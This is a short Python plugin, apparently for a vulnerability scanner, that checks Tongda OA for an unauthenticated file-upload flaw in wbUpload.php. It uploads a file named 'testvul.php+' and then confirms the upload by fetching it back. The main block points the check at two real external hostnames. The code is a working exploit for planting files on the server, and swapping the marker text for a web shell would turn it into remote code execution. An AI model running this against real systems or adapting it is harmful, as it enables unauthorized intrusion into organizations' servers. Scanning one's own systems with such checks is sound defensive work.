#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: tongdaoa(通达oa)wbUpload.php无需登录getshell
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2013-037642

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    
    post_data = '''------WebKitFormBoundaryUynkBEtg4g2sRTR3\r
Content-Disposition: form-data; name="Filedata"; filename="temp.jpg"\r
Content-Type: image/jpeg\r
\r
testvul...\r
------WebKitFormBoundaryUynkBEtg4g2sRTR3--\r
'''
    content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUynkBEtg4g2sRTR3'
    upload_url = arg + 'general/vmeet/wbUpload.php?fileName=testvul.php+'
    #proxy = ('127.0.0.1', 8887)
    code, head, res, errcode, _ = curl.curl2(upload_url, post=post_data, header = content_type)
    #print head
    if code != 200:
        return False
    verify_url = arg + 'general/vmeet/wbUpload/testvul.php'
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'testvul...' in res:
        security_hole(arg + '：通达oa无需登录getshell')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://oa.henlee.cn/')[1])
    audit(assign('tongdaoa', 'http://kingsoa.kingsenglish.com.cn:81/')[1])
